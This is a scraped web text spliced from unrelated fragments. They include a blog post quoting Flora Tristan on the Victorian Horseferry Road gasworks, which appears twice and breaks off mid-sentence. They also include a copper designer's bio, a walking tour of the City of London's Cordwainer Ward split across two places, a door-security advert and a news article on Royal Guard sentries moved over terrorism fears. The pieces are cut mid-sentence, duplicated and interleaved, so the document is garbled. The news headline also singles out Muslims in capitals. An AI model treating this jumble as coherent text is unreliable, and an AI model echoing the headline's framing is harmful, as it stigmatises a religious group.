with a space below to catch the coke. The stokers, armed with long <b>iron</b> rakes, opened the ovens and raked out the coke, which fell in blazing torrents into the chamber below. Nothing could be more terrible or majestic than the sight of so many mouths all pouring forth flames, nothing more magical than the cavern suddenly illumined with living fire, descending like a waterfall from a rocky height, only to be swallowed in the abyss: nothing more terrifying than the stokers, their bodies streaming as if they had just emerged from the water, lit on both sides by the dreadful braziers that thrust out their fiery tongues as if to devour them. Oh, no! a more frightful spectacle it would be impossible to imagine!</p>    <figure>     <figcaption>      South Metropolitan Gas Company&#x2019;s works, East Greenwich,      <b>London</b>: Quenching coke, .     </figcaption>    </figure>    <p>When the furnaces were half empty, men perched on vats in the four corners of the lower chamber threw water on the coke to extinguish it. The scene changed; there arose a dense hot whirlwind of black smoke which ascended majestically through the open skylight. Now the furnaces were visible only through this haze, which made the flames seem even redder and the fire more menacing; the stokers&#x2019; bodies turned from white to black, and the unfortunate wretches were swallowed up like demons in some infernal chaos. I was caught unawares by the smoke, and barely had time to make a hasty descent.</p>    <p>I awaited the end of the business, anxious to see what would become of the poor stokers. I was astounded that not one woman appeared. Dear God! I thought, have the men no mother, sister, wife or daughter waiting at the door as they emerge from that hell, to wash them in warm water, to wrap them in shirts of flannel; to give them something nourishing to drink; to greet them with friendly words that would give them heart and help them to endure their cruel lot? I was in a fever of anxiety; not one woman appeared. I demanded of the foreman where these men, soaked in sweat, would go to take their rest. &#x2018;They&#x2019;ll lie down in this shed.&#x2019; he replied, quite unconcerned, &#x2018;and in a couple of hours they&#x2019;ll go back to their stoking,&#x2019;</p>   </blockquote>   <p>I find this simultaneously horrific in what men were forced to suffer to earn a wage, and almost laughable in terms of her horror at the absence of women occupying such middle-class Victorian roles as mopping their husband&#x2019;s brow and inspiring him with hope and bringing him nourishment. I imagine these wives, sisters and daughters were all both hungry and hard at work themselves keeping households together or taking in laundry, cleaning the homes of the wealthy, working in factories themselves.</p>   <p>But again, we return to another of the reasons men died so quickly in this work:</p>   <blockquote>    <p>This shed, open on all sides to the wind, was really no more than a shelter from the rain, and inside it was as cold as ice. A sort of mattress lay in one corner, almost indistinguishable from the coal around it. I saw the stokers stretch out on their stony bed, with no covering but a greatcoat so stained with sweat and coal-dust that it was impossible to tell its original colour. &#x2018;There,&#x2019; said the foreman, &#x2018;that&#x2019;s how these men get consumption; they don&#x2019;t look after themselves, going straight from the heat into the cold like that.&#x2019; (72-75)</p>   </blockquote>   <p>You like Tristan better when she says she left in a huff after that remark.</p>   <p>A few more things on gas &#x2014; in <em>,</em> there is a brief description of the workers organising for the first time at the &#x2014; owned by the same company &#x2014; under the leadership of Will Thorne. They won an eight hour day (it is impossible to imagine working in these conditions at all, much less from 10 to 14 hours), with fewer retorts to fill and all for the same daily wage. Long live the union.</p>   <figure>    <figcaption>     &#x201c;Watson House, Gas Light &amp; Coke Company in Londen (1933)&#x201d; by Willem van de Poll &#x2013; Nationaal Archief. Licensed under CC BY-SA 3.0 via    </figcaption>   </figure>   <p>The other is that in addition to the poisoning of air and ground, the construction of gas works was also a part of the steady destruction of gardens supplying the city, from :</p>   <blockquote>    <p>The works belonging to the Gas Light and Coke Company, which occupy a considerable space of ground between Peter Street and Horseferry Road, stand partly on the site of what was, at the beginning of the present century, the residence of a market-gardener, known as the &#x201c;Bower&#x201d; ale-house and tea-gardens&#x2014;a name still perpetuated in that of the adjacent public-house&#x2014;&#x201d;The White Horse and Bower,&#x201d; in the Horseferry Road. These gasworks (one of the three earliest stations established by the first gas company in the metropolis, which received its charter of incorporation in 1812) owe their origin to the enterprise of a Mr. Winsor, the same who, on the evening of the King&#x2019;s birthday, in 1807, made a brilliant display of gas along the wall between the Mall and St. James&#x2019;s Park. It may be worth while to note here that the general lighting of the metropolis with gas began on Christmas Day, 1814. A branch establishment in connection with these gas-works has since been erected further westward, close by Millbank Prison, and more recently a larger establishment has been opened at North Woolwich, where the works henceforth will mainly be concentrated, so that latterly very little business has been actually carried on here.</p>   </blockquote>   <p>The later history of these gas works is also rather fascinating, and described on the site:</p>   <blockquote>    <p>The &#x2018;Rotundas&#x2019; consisted of three buildings, two of three storeys and one of two (originally ), all linked together and occupying a site in SW1 bounded by Great Peter Street to the north, Marsham Street to the east, Horseferry Road to the south and Monck Street to the west. The site had previously been occupied since c.1877 by the gas works of the Gas Light and Coke Company. The two gas holders were demolished in 1937 leaving two very large circular holes in the ground. During the blitz a large bomb fell on the gas works which blew four workmen into these holes, unfortunately only two survived.</p>    <p>A government contract was issued to construct various protected buildings in <b>London</b>, these included Montagu House in Whitehall for the War Office, Curzon House in Curzon Street for the Army, The Admiralty Citadel on Horseguards for the Navy and the Rotundas, all designed to withstand the impact of a 500lb bomb. With their 12 foot thick concrete roof the latter complex was equipped to house several thousand Government officials in complete safety from enemy attack for up to three months.</p>    <p>The Rotundas were built in the holes left by the gas holders, each of three storeys with one and a half floors above ground and the same below. They were identified as the North Rotunda at 59-67 Great Peter Street, the South Rotunda at 18/19 Monck Street. The complex was completed by the five storey Steel Frame Building, with one level below ground at 17 Monck Street. The upper three stories were later removed.</p>   </blockquote>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

It&#x2019;s knowing what you want to make, that&#x2019;s the test. I&#x2019;ve been exploring copper for ten years now. Pulling and pushing the boundaries of what convention says can be done with the metal.&#xa0; My African education in design has, I think, only helped this process. I&#x2019;m not bogged down by pre-conceived ideas. Change comes easily to me. Maybe that&#x2019;s why copper and I get on so well. We&#x2019;re both adaptable.&#x201d;</p>     <p>Stephen Myburgh was born in Durban, South Africa. After his national service he left South Africa and began a long voyage of discovery. &#x201c;My travels have taken me all over the world. From the jungles of Guatemala to the deserts of Egypt. It is these places and these experiences that help me see the world as I see it now.&#x201d;</p>     <p>In 1997 his wanderings brought him to London. It was in London that he started to explore metal work on a large scale. In 1998 in partnership with Caroline Fletcher (whom he would later marry), Myburgh Designs launched the Mood Swing collection.</p>     <p>&#x201c;Nature and its subtleties have always been my design program. But opulence and luxury offer the theater that I love to live with. Copper is a wonderful medium to merge these two desires&#x201d;. Stephen Myburgh&#x2019;s swings are hand made sculptures&#xa0; that bring into your homes this feeling of natural opulence.

   <div>   <p>Although they do not have so much of a physical presence today, the Wards of the City of London are centuries old partitions of the City into individual areas with their own administrative, financial and governance functions. The history of the Wards goes back to Medieval times with their origins&#xa0;almost certainly&#xa0;being earlier. They were probably&#xa0;the ancient estates within the City of someone in a role similar to a lord of the manor and had some level of civil and criminal jurisdiction over the Ward.</p>   <p>Documents written in the&#xa0;12th Century refer to the Ward system and to the names of Alderman of the Wards who held a largely hereditary position with the role of Alderman becoming an elected role during the reign of Edward III (1327 &#x2013; 1377), by which time the Wards appear to have assumed&#xa0;names similar to those of today.</p>   <p>In walking and exploring&#xa0;the City of London, I find&#xa0;it is the Streets, Churches and Wards that provide tangible contact with London&#x2019;s long history.</p>   <p>One such ward is Cordwainers&#xa0;Ward, just to the east of St. Paul&#x2019;s Cathedral and to the south of Cheapside. The following map from 1755 shows Cordwainer&#xa0;Ward, south of Cheapside with boundary wards shown along the edge. Breadstreet Ward is not marked, but is to the left, the boundary being&#xa0;the street of the same name.</p>   <p>Cordwainer&#xa0;Ward is one of the few examples of where wards have been named after the trade practiced by the inhabitants. The name is derived from the early English word &#x201c;cordwaner&#x201d; meaning a worker in &#x201c;cordwane&#x201d; which was leather from the town of Cordova in Spain and the name dates back to around the 12th / 13th Century.</p>   <p>Shoe manufacture and sale&#xa0;was one of the key trades within the ward and in Henry 2nd&#x2019;s reign (1154 to 1189) the sale of shoes was only allowed in the shoe market in Cheap between Cordwainer Street and Soper Lane (now Bow Lane and Queen Street).</p>   <p>Cordwainers&#xa0;were among the first of the craft organisations having received ordinances from the Mayor of London in 1271. Despite holding a prominent position in the early trades of London, in 1303 the Cordwainers&#xa0;were the subject of public complaints of fraud, in that they were using inferior leathers mixed in with the superior Cordova leather.&#xa0; There was also an ongoing&#xa0;rivalry with the Cobblers, and the Cordwainers were forbidden to mend shoes and the Cobblers forbidden to make them.</p>   <p>The craft is now commemorated&#xa0;by a Cordwainer&#xa0;statue erected in 2002 by the Ward of Cordwainer&#xa0;Club, which can be found in Watling&#xa0;Street, and is a good place to start a walk exploring Cordwainer Ward.</p>   <p>The plaque reads <em>&#x201d; You are in the Ward of Cordwainer&#xa0;which in medieval times was the centre of shoe making in the City of London. The finest leather from Cordoba in Spain was used and gave rise to the name of the craftsmen and the Ward. The Cordwainer&#xa0;statue was erected in 2002 to celebrate the century of the Ward of Cordwainer Club.&#x201d;</em></p>   <p>Records of the names of the Aldermen of Cordwainer Ward go back to circa 1115 and appear to be continuous to the present day. The trades of each Alderman demonstrate the range of activities carried out in the Ward over the centuries, for example:</p>   <p>1313 Simon Corp, Pepperer</p>   <p>1375 John de Northampton, Draper</p>   <p>1599 William Craven, Merchant Taylor</p>   <p>1687 John Gardner, Skinner</p>   <p>1774 George Hayley, Armourer</p>   <p>1784 Brook Watson, Musician</p>   <p>1875 George Swan Nottage, Spectacle Maker</p>   <p>Opposite the Cordwainer&#xa0;statue in Watling&#xa0;Street&#xa0;is the site of the headquarters of the&#xa0;London Salvage Corps. Formed in 1865, the London Salvage Corps was effectively a private service operated by the London insurance companies. Their primary task was salvage both during and after a fire. During a fire, the Core would try to protect and recover goods and property and after a fire the Corps was responsible for the salvaged goods and property if insured, or until the insurance position could be ascertained.</p>   <p>The London Salvage Core operated until 1982.&#xa0;The change in building usage in the City from warehousing to offices meant that&#xa0;the risk of fire was reduced and there were no longer goods to be salvaged.</p>   <p>Watling&#xa0;Street is considered to be one of the oldest streets in the city and originally a Roman road running from Dover through to Chester. Watling&#xa0;Street outside of London can easily be traced on Ordnance Survey maps, or by driving the route. Long straight roads passing through Dunstable, Towcester, to the east of Rugby, between Nuneaton and Hinckley clearly demonstrate the Roman origins of this street.</p>   <p>On approaching central London, the original Watling&#xa0;Street passed down Edgware&#xa0;Road to the area where Marble Arch is currently located where it split into two. One branch headed to Thorney&#xa0;Island (Westminster) whilst the other branch ran along Oxford Street and Holborn, crossing the Fleet and then entering the City by the New Gate. It met up with the current City Watling Street just south of Bow Lane. The part leading up to St. Paul&#x2019;s is a relocation of the original route following a fire in 1136 after which a market had sprung up on the course of the old road.</p>   <p>Looking up Watling&#xa0;Street towards St. Paul&#x2019;s Cathedral (Cordwainer&#xa0;Ward ends and Breadstreet Ward starts roughly where the red van is located):</p>   <p>Running across Watling Street is Bow Lane, here leading up to the church of St. Mary-le-Bow and Cheapside.</p>   <p>Bow Lane is a good example of how street names have changed over the centuries.</p>   <p>The name Bow Lane came from the church, but was not used until the middle of the sixteenth century. Prior to being&#xa0;named Bow Lane, the lower part was called&#xa0;Cordwainer&#xa0;Street with the upper part approaching Cheapside named Hosier&#xa0;Lane due to the hosiers who lived in the lane.</p>   <p>The section of Bow Lane that originally extended south of Cannon Street,&#xa0;is now Garlick Hill.</p>   <p>The following photo shows the church of St. Mary-le-Bow. I explored the church in a post which can be found which included my father&#x2019;s photos showing the devastation in the area following the last war.</p>   <p>William Maitland writing in 1756 records Wren&#x2019;s observations on the discovery of a Roman Causeway during the rebuilding of St. Mary-le-Bow:</p>   <p>&#x201c;<em>The church stood about 40 feet backwards from the high street, and by purchasing the ground of one private house not yet rebuilt he was enabled to bring the steeple forward so as to range with the street houses in Cheapside.&#xa0;Here, to his surprise, he sunk about 18 feet deep through much ground and then imagined he was come to the natural soil, and hard gravel but upon full examination, it appeared to be a Roman causeway of&#xa0;rough stone, close and well rammed, with Roman brick and rubbish at the bottom, for a foundation and all firmly cemented. This causeway was four feet thick. Underneath this causeway lay the natural clay over which that part of the city&#xa0;stands, and which descends at least 40 feet lower. He concluded then to lay the foundation of the Tower upon the very Roman Causeway, as most proper to bear what he had designed, a weighty and lofty structure.&#x201d;&#xa0;</em></p>   <p>This account really brings home that everything we see in London today is built on centuries of earlier construction, and it is fascinating to stand in Cheapside, look at the tower of St. Mary-le-Bow and if Wren&#xa0;was right there is a Roman causeway below, supporting the weight of the tower.</p>   <p>As well as St. Mary-le-Bow there were a number of other churches in Cordwainer&#xa0;Ward.</p>   <p>Walk back down Watling&#xa0;Street, turn left up Queen Street then across to Pancras&#xa0;Lane. Before the Fire of London there were two churches in this short lane which gives an indication of t   <div>   <div>    <h1>DOOR SECURITY <b>LONDON</b> BAR</h1>   </div>   <div>    <p>Kickstop &#x2013; largest manufacturer of crime prevention secondary door security products police authority recommends fitting reinforcer products including a <b>London</b> bar Door Supervisor Needed As Part Of A Small Team In Norbury, Near Croydon.

British Security chiefs have taken the dramatic step of withdrawing Royal Guards from their high-profile posts outside palaces amid mounting fears of &#x2018;lone wolf&#x2019; MUSLIM terrorist attacks.&#xa0;</span></h2>    <h4><span><span>&#xa0;</span> Elite soldiers of the Queen&#x2019;s Guard have pulled back from public positions at many landmarks in response to possible threats from Islamic extremists. For the first time since the height of the IRA&#x2019;s terror campaign, the soldiers are also no longer allowed on sentry duty alone, and are now accompanied by armed police.</span></h4>    <h4><span>Retired officer Major Iain Dalzel-Job of the Scots Guards told The Mail on Sunday: &#x2018;I think this is a big shame.&#xa0;&#x2018;The reason people know we&#x2019;re around is because they can see us. But I suppose the changes are necessary as there is a significant threat.&#x2019;</span></h4>    <h4><span>This newspaper has confirmed the changes to the Guards&#x2019; security at sites including Clarence House, St James&#x2019;s Palace, Windsor Castle and Horse Guards Parade.&#xa0;At Clarence House, the official residence of Prince Charles, the guardsmen who used to stand in front of the <b>gates</b> on The Mall, a public road, have now been relocated, along with their sentry boxes, behind metal <b>gates</b>.&#xa0;</span></h4>    <h4><span>Tourists, who love to pose with the Guards, can now barely see them. Police officers confirmed changes had been made for security reasons.&#xa0;At St James&#x2019;s Palace, the <b>London</b> home of Princess Anne and Princesses Beatrice and Eugenie, two Guardsmen used to perform sentry duties beneath its famous clock tower on Pall Mall.&#xa0;</span></h4>    <h4><span>These guards and their sentry boxes have now been moved into a secluded courtyard inside the perimeter, leaving no visible presence at the clock tower gate.&#xa0;In Horse Guards Parade, two sentries still stand guard where tourists can pose for photographs with them. But four armed police officers now guard the soldiers. &#xa0;The officers carry Heckler and Koch carbine rifles, pistols and Taser guns &#x2013; in contrast to the Guards, who just carry ceremonial swords.</span></h4>    <h4><span>A Metropolitan Police officer on duty there told our reporter: &#x2018;Yes, we are a recent addition here. It&#x2019;s us guarding the Guards. I think there&#x2019;s a Latin phrase for that.&#x2019;&#xa0;At Windsor Castle, up to three armed officers now stand next to the lone sentry on guard duty on the Western side of the castle.</span></h4>    <h4><span>The tightening of security to levels unseen since the height of the IRA terror campaign comes in the wake of Muslim terrorists from the Islamic State based in Iraq and Syria threatening Britain. &#xa0;Al-Qaeda groups have also called on would-be terrorists to launch &#x2018;lone wolf&#x2019; attacks against UK soldiers and police.</span></h4>    <h4><span>On Christmas Eve, Al-Qaeda in the Arabian Peninsula (AQAP) encouraged Muslims to launch attacks in the West on their own.&#xa0;It published a magazine that gave instructions for a home-made bomb, and urged its readers to use such a device to blow up an airliner or other Western target.</span></h4>    <h4><span>Former soldiers said last night that the changes were needed as sentries felt vulnerable to attack. &#xa0;One Guards insider said: &#x2018;We&#x2019;re fully in favour as if an attack on a sentry can happen in Canada it can happen here. By moving behind the <b>railings</b> we&#x2019;ve got a chance to respond, most likely saving lives.</span></h4>    <h4><span>&#x2018;The terrorists know that a Guardsman is a higher profile target than an ordinary soldier and they&#x2019;re looking for publicity, something spectacular, so the Guards would suit their agenda.&#x2019;</span></h4>    <h4><span>Although there have not been any successful terror attacks in Britain since Lee Rigby was killed outside Woolwich Barracks in May last year, intelligence services say they have foiled a number of plots this year.&#xa0;Last month, police stopped an alleged plot to launch an attack on Remembrance Sunday, after arresting four men in <b>London</b> and High Wycombe, Buckinghamshire.&#xa0;</span></h4>    <h4><span>Also last month, police chiefs warned officers not to wear their uniforms to and from work as Islamic terrorists were looking to target officers.</span></h4>    </div>    <p> <span>By &#x2022;</span> <span> &#x2022;</span> </p>  </div>

   <div>   <p>Gas lighting transformed London, it is hard to imagine now just how much. I think the only way to begin to understand it, as much as we can from this vantage point, is through literature.</p>   <p> is wonderfully evoctive of the beauty of gas lighting, the magical effect it had on London:</p>   <blockquote>    <p>But it is especially at night that London should be seen: then, in the magic light of millions of gas-lamps, London is superb! Its broad streets stretch to infinity; its shops are resplendent with every masterpiece that human ingenuity can devise; its multitudes of men and women pass ceaselessly too and fro. To see all this for the first time is an intoxicating experience. Then again, in the daytime, the beautiful streets, the elegant squares, the austere iron gates which separate the family mansion from the common run of humanity, the vast expanse of gracious rolling parkland, the beauty of the trees, the number of superb carriages and magnificent horses which parade the streets &#x2014; all this seems magical and blurs the judgment, so that no foreigner can fail to be entranced when he first enters the British capital. But I must warn you that the spell fades like a fantastic vision, a dream in the night; the foreigner soon recovers his senses and opens his eyes to the arid egotism and gross materialism which lurk behind that ideal world (17).</p>   </blockquote>   <p>I&#x2019;m not sure that something hasn&#x2019;t been lost now, the texture of the light changed and the last remaining shadowy places illuminated with electricity. There are still a few streets where you can experience gas lighting, you can find them . It&#x2019;s something well loved and well studied, a short description of how and when it came to illuminate London&#x2019;s streets can be found , or more at length in &#x2018;s work on <em>Victorian London</em>. The way it transformed how people could walk through the city at night, especially women, is so self-evident yet often forgotten.</p>   <p>Also often forgotten, I think, is the labour and technology that made is possible. One of the most powerful passages of Tristan&#x2019;s journal describes the gasworks at Horseferry Road. There is nothing at all left to show that a gas works once stood here but a plaque.&#xa0; Tristan&#x2019;s words give a vivid sense of the working conditions:</p>   <blockquote>    <p>One of the largest gas-works is in Horseferry Road. Westminster; I have forgotten the name of the company. You can not visit it without a ticket of admission: In this palace of industry the abundance of machinery and iron is quite overwhelming; everything is made of iron &#x2014; platforms. railings, staircases. floors, roofing etc.; plainly no expense has been spared to ensure that buildings and equipment alike are made of the most durable materials. I saw cast-iron vats with the dimensions of a four-storey house. I wanted to know how many thousand tons they hold, but the foreman with me was just as uncommunicative as the foreman at the brewery, and preserved an absolute silence.</p>    <p>We went into the big boiler-house: the row of furnaces on either side were burning brightly; the scene was not unlike the descriptions the poets of Antiquity have left us of Vulcan&#x2019;s forges, save that the Cyclops were animated with divine activity and intelligence, whereas the black slaves of the English furnaces are sullen, silent and impassive. There were about twenty men present, going about their work in a slow, deliberate fashion. Those with nothing to do stood motionless, lacking the energy even to wipe away the sweat streaming down their bodies, Two or three turned their blank gaze towards me; the rest did not even raise their heads. The foreman told me that only the strongest men were selected as stokers; even so, they all developed chest diseases after seven or eight years of the work, and invariably died of consumption. That accounted for the misery and apathy depicted on every countenance and apparent in every movement the poor wretches made.</p>   </blockquote>   <p>This language is so emblematic of the odd politics of her solidarity with, and yet low opinion of, the working classes. She is offhand about their early deaths, but it breaks my heart to think of it.</p>   <blockquote>    <p>The work demanded of them is more than human strength can endure. They wear nothing but cotton drawers; when they leave the boiler-house they merely throw a coat over their shoulders.</p>    <p>Although the space between the two rows of furnaces must have been fifty or sixty feet, the floor was so hot that the heat penetrated my shoes immediately and made me lift up my feet as if I had stepped on live coals. I stood upon a large stone slab, but even this was <em>hot</em>, although it was well off the ground. I could not stay in this veritable hell; the heat was suffocating, the smell of gas was making me dizzy and my chest felt as if it would burst. The foreman took me to a gallery at the end of the boiler-house where I could see everything in relative comfort.</p>    <p>We made a complete tour of the establishment; I was lost in admiration for all the machines, for the meticulous care that marks every stage of the work; but in spite of all precautions there are frequent disasters in which men are injured and even killed. 0 God! Can progress be bought only at the cost of men&#x2019;s lives?</p>   </blockquote>   <p>She is not, and I could hardly expect her to be, interested in the geographies of light, that this is gas produced to light up the expensive shops of the West End at the cost of workingmen&#x2019;s lives and environment:</p>   <blockquote>    <p>The gas produced at this factory is taken by pipes to light the Oxford Street area as far as Regent Street.</p>    <p>The air is horribly tainted: at every instant you are assailed by poisonous fumes. I emerged from one building, hoping to find the air purer in the yard outside, but everywhere I went, the foul exhalations of gas and the stench of coal and tar pursued me.</p>   </blockquote>   <p>Not only is this killing the men who work here, it surely must also be killing all those who live around it, albeit more slowly. Her lack of interest in how this is affecting the poor people and dock workers living in the area is in its own way a testament to what communities fighting for environmental justice have been able to achieve.</p>   <p>It also makes me wish that she were not writing from such a position of privilege, that she had from wherever she was staying, for surely then the effect of the fumes and the housing of the workers would have also figured in this description. As it was, Tristan was there only briefly and already felt dizzy and sick. Odd then, and oddly Victorian, that she focuses in on the dirt.</p>   <blockquote>    <p>What is more, the entire premises are very dirty. The yard &#x2014; with its pools of stagnant water and piles of rubbish &#x2014; testifies to a total neglect of hygiene. It is true that the materials used to produce gas are of such a nature that it would require vigorous measures to keep the place clean, but two men would be sufficient for the task, and for a trifling increase in outlay, the entire establishment would be healthier.</p>   </blockquote>   <p>Returning once more to the working conditions suffered:</p>   <blockquote>    <figure>     <figcaption>      Retort House, Great Central Gas Works, Bow Common, London. It was here that Croll introduced the burning of incandescent coke as fuel immediately it had be taken from retorts. 10% saving.     </figcaption>    </figure>    <p>I was on the point of suffocating and could not wait to escape from such an evil-smelling place when the foreman said, &#x2018;Stay a moment longer, there&#x2019;s something very interesting for you to see; the stokers are just about to remove the coke from the ovens.&#x2019;</p>    <p>I returned to my perch in the gallery; the sight that met my eyes was one of the most appalling that I have ever seen.</p>    <p>The furnaces are above ground level. with a space below to catch the coke.

 ovens and raked out the coke, which fell in blazing torrents into the chamber below. Nothing could be more terrible or majestic than the sight of so many mouths all pouring forth flames, nothing more magical than the cavern suddenly illumined with living fire, descending like a waterfall from a rocky height, only to be swallowed in the abyss: nothing more terrifying than the stokers, their bodies streaming as if they had just emerged from the water, lit on both sides by the dreadful braziers that thrust out their fiery tongues as if to devour them. Oh, no! a more frightful spectacle it would be impossible to imagine!</p>    <figure>     <figcaption>      South Metropolitan Gas Company&#x2019;s works, East Greenwich, London: Quenching coke, .     </figcaption>    </figure>    <p>When the furnaces were half empty, men perched on vats in the four corners of the lower chamber threw water on the coke to extinguish it. The scene changed; there arose a dense hot whirlwind of black smoke which ascended majestically through the open skylight. Now the furnaces were visible only through this haze, which made the flames seem even redder and the fire more menacing; the stokers&#x2019; bodies turned from white to black, and the unfortunate wretches were swallowed up like demons in some infernal chaos. I was caught unawares by the smoke, and barely had time to make a hasty descent.</p>    <p>I awaited the end of the business, anxious to see what would become of the poor stokers. I was astounded that not one woman appeared. Dear God! I thought, have the men no mother, sister, wife or daughter waiting at the door as they emerge from that hell, to wash them in warm water, to wrap them in shirts of flannel; to give them something nourishing to drink; to greet them with friendly words that would give them heart and help them to endure their cruel lot? I was in a fever of anxiety; not one woman appeared. I demanded of the foreman where these men, soaked in sweat, would go to take their rest. &#x2018;They&#x2019;ll lie down in this shed.&#x2019; he replied, quite unconcerned, &#x2018;and in a couple of hours they&#x2019;ll go back to their stoking,&#x2019;</p>   </blockquote>   <p>I find this simultaneously horrific in what men were forced to suffer to earn a wage, and almost laughable in terms of her horror at the absence of women occupying such middle-class Victorian roles as mopping their husband&#x2019;s brow and inspiring him with hope and bringing him nourishment. I imagine these wives, sisters and daughters were all both hungry and hard at work themselves keeping households together or taking in laundry, cleaning the homes of the wealthy, working in factories themselves.</p>   <p>But again, we return to another of the reasons men died so quickly in this work:</p>   <blockquote>    <p>This shed, open on all sides to the wind, was really no more than a shelter from the rain, and inside it was as cold as ice. A sort of mattress lay in one corner, almost indistinguishable from the coal around it. I saw the stokers stretch out on their stony bed, with no covering but a greatcoat so stained with sweat and coal-dust that it was impossible to tell its original colour. &#x2018;There,&#x2019; said the foreman, &#x2018;that&#x2019;s how these men get consumption; they don&#x2019;t look after themselves, going straight from the heat into the cold like that.&#x2019; (72-75)</p>   </blockquote>   <p>You like Tristan better when she says she left in a huff after that remark.</p>   <p>A few more things on gas &#x2014; in <em>,</em> there is a brief description of the workers organising for the first time at the &#x2014; owned by the same company &#x2014; under the leadership of Will Thorne. They won an eight hour day (it is impossible to imagine working in these conditions at all, much less from 10 to 14 hours), with fewer retorts to fill and all for the same daily wage. Long live the union.</p>   <figure>    <figcaption>     &#x201c;Watson House, Gas Light &amp; Coke Company in Londen (1933)&#x201d; by Willem van de Poll &#x2013; Nationaal Archief. Licensed under CC BY-SA 3.0 via    </figcaption>   </figure>   <p>The other is that in addition to the poisoning of air and ground, the construction of gas works was also a part of the steady destruction of gardens supplying the city, from :</p>   <blockquote>    <p>The works belonging to the Gas Light and Coke Company, which occupy a considerable space of ground between Peter Street and Horseferry Road, stand partly on the site of what was, at the beginning of the present century, the residence of a market-gardener, known as the &#x201c;Bower&#x201d; ale-house and tea-gardens&#x2014;a name still perpetuated in that of the adjacent public-house&#x2014;&#x201d;The White Horse and Bower,&#x201d; in the Horseferry Road. These gasworks (one of the three earliest stations established by the first gas company in the metropolis, which received its charter of incorporation in 1812) owe their origin to the enterprise of a Mr. Winsor, the same who, on the evening of the King&#x2019;s birthday, in 1807, made a brilliant display of gas along the wall between the Mall and St. James&#x2019;s Park. It may be worth while to note here that the general lighting of the metropolis with gas began on Christmas Day, 1814. A branch establishment in connection with these gas-works has since been erected further westward, close by Millbank Prison, and more recently a larger establishment has been opened at North Woolwich, where the works henceforth will mainly be concentrated, so that latterly very little business has been actually carried on here.</p>   </blockquote>   <p>The later history of these gas works is also rather fascinating, and described on the site:</p>   <blockquote>    <p>The &#x2018;Rotundas&#x2019; consisted of three buildings, two of three storeys and one of two (originally ), all linked together and occupying a site in SW1 bounded by Great Peter Street to the north, Marsham Street to the east, Horseferry Road to the south and Monck Street to the west. The site had previously been occupied since c.1877 by the gas works of the Gas Light and Coke Company. The two gas holders were demolished in 1937 leaving two very large circular holes in the ground. During the blitz a large bomb fell on the gas works which blew four workmen into these holes, unfortunately only two survived.</p>    <p>A government contract was issued to construct various protected buildings in London, these included Montagu House in Whitehall for the War Office, Curzon House in Curzon Street for the Army, The Admiralty Citadel on Horseguards for the Navy and the Rotundas, all designed to withstand the impact of a 500lb bomb. With their 12 foot thick concrete roof the latter complex was equipped to house several thousand Government officials in complete safety from enemy attack for up to three months.</p>    <p>The Rotundas were built in the holes left by the gas holders, each of three storeys with one and a half floors above ground and the same below. They were identified as the North Rotunda at 59-67 Great Peter Street, the South Rotunda at 18/19 Monck Street. The complex was completed by the five storey Steel Frame Building, with one level below ground at 17 Monck Street. The upper three stories were later removed.</p>   </blockquote>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

he population densities in the area (in March 1587, Cordwainer Ward contributed 301&#xa0;fully armed and equipped men following the request of Queen Elizabeth 1st for soldiers from the City during one of the many invasion scares during the Tudor period. The full table of all City Ward contributions is in my post on ). William Maitland states that in 1631 there were 2238 persons living in the Ward.</p>   <p>Walk down Pancras&#xa0;Lane and we come to the&#xa0;site of St. Pancras Church. This was one of the churches destroyed in the Great Fire that was never rebuilt although the graveyard continued to be used until 1853. The land was left derelict for many years, but was recently purchased by the City of London and transformed into a small garden.</p>   <p>As part of the transformation, a competition was held and the winning design included the installation of a range of beautifully carved benches with their designs based on the Romanesque architecture of the church rising afresh from the ground after the Great Fire.</p>   <p>The benches were carved by students from the City &amp; Guilds of London Art School.</p>   <p>The background to the design of the garden and the carved benches can be found on the website of .</p>   <p>Writing in 1910, Walter Besant states that the graveyard of St. Pancras <em>&#x201c;bears a great similarity to all that is left of the others; it is covered with dingy gravel and decorated by blackened evergreens. the iron gate bears a little shield telling that it was erected in 1886. There are one or two tombs still left.&#x201d;</em></p>   <p>Continue the short distance down Pancras&#xa0;Lane to where it turns right into Sise&#xa0;lane and this is the location of another&#xa0;church lost in the Great Fire, the church of St. Benet Sherehog. &#xa0;There are two plaques recording the church. On the left of the gates, just above the silver bollard is a reproduction of the original stone slab that reads: <em>&#x201c;Before the dreadful Fire, Anno 1666, stood the church of St. Benet Sherehog&#x201d; </em>The blue plaque on the right of the gates records the church on one of the standard city plaques.</p>   <p>There are&#xa0;a couple of possible sources for the name St. Benet Sherehog. The church was originally dedicated to St. Osyth, however it was repaired by one Benedict Shorne, or Sherehog&#xa0;in the reign of Edward II and as a result of the repair the benefactor gave his name to the church. An alternative source is from the hogs that may have wallowed on the shores of the Wallbrook, or the ditches that ran into the stream.</p>   <p>The most frequent reference is to Benedict Shorne, but as with many of the street and church names in the city, the real source of the name is hidden in the centuries that have passed. It is an old name, appearing as early as the twelfth century.</p>   <p>Again writing in 1910, Walter Besant states there remains <em>&#x201c;the railing and low wall were put up in 1842. Within the enclosure stands a tomb over the Family Vault of Michael Davison, 1676&#x201d;.&#xa0;&#xa0;</em>At the time of his death, Michael Davison left a charitable gift to provide &#xa3;5 per annum for keeping his family vault in repair.</p>   <p>The Museum of London excavated the graveyard of&#xa0;St. Benet Sherehog&#xa0;between 1994 and 1996 as part of the No. 1 Poultry development. There were 274 burials excavated and following analysis of 270 of these, 39 were identified as being from the Medieval period.</p>   <p>At the end of Pancras&#xa0;Lane, the street bends to the right to all that remains of Sise Lane.</p>   <p>Sise Lane is a corruption of St.&#xa0;Osyth, a&#xa0;Mercian Queen reputedly&#xa0;martyred around&#xa0;the year 700.</p>   <p>From the end of Sise&#xa0;Lane we can walk south along Queen Victoria Street. We cut across Queen Street which runs down towards Southwark Bridge and north to Cheapside. Queen Street is another that has changed name. Originally known as Soper Lane, or Soapers&#xa0;Lane from the soapmakers&#xa0;who lived in this area. The name was changed to Queen Street soon after the Fire of London in honour of the wife of&#xa0;King Charles II, Queen Catherine of Braganza.</p>   <p>Queen Street&#xa0;/ Soper Lane appears to have a history for markets. In 1297 there was an evening market here called the &#x201c;New 